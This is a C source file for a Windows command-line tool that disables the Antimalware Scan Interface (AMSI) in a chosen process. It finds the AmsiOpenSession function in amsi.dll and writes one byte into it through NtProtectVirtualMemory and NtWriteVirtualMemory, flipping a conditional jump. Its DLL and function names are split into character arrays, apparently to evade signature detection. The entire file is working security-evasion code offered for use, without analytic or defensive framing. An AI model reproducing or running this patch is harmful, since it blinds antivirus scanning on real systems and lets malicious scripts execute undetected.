#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")


#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

char ams1[] = { 'a','m','s','i','.','d','l','l',0 };
char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0 };

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);


DWORD64 GetAddr(LPVOID addr) {

	for (int i = 0; i < 1024; i++) {
		
		if (*((PBYTE)addr + i) == 0x74) return (DWORD64)addr + i;
	}

}


void AMS1patch1(HANDLE hproc) {

	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);


	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, "\x75");

	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));
	void* ptraddr = (void*)((DWORD64)ptr + 0x3);
	void* ptraddr2 = (void*)GetAddr(ptr);
		
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		return;
	}
	
	printf("\n[+] AMSI patched !!\n\n");




}


int main(int argc, char** argv) {

	HANDLE hProc;

	if (argc != 2) {
		printf("USAGE: AMS1-Patch.exe <PID>\n");
		return 1;
	}

	hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
	if (!hProc) {
		printf("Failed in OpenProcess (%u)\n", GetLastError());
		return 2;
	}

	
	AMS1patch1(hProc);
	

	return 0;

}